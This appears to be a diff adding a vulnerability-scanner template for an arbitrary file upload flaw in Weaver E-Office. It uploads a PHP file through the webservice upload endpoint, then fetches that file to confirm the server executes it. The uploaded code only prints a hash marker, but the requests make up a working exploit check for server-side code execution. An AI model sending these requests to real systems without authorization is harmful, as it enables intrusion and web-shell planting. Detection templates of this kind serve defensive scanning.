@@ -1,0 +1,60 @@
+id: weaver-e-office-webservice-anyfile-upload
+info:
+  name: Weaver E-Office Webservice Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{rand_int(1000, 10000)}}"
+  t3: "{{md5(to_string(t2))}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/webservice/upload/upload.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{t1}}"
+    body: |-
+      ------WebKitFormBoundary{{t1}}
+      Content-Disposition: form-data; name="file"; filename="{{t2}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t2}});?>
+      ------WebKitFormBoundary{{t1}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".php"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+    extractors:
+      - type: regex
+        name: file_id
+        internal: true
+        regex:
+          - "(?P<id>[0-9]{7,12})"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/attachment/{{file_id}}/{{t2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
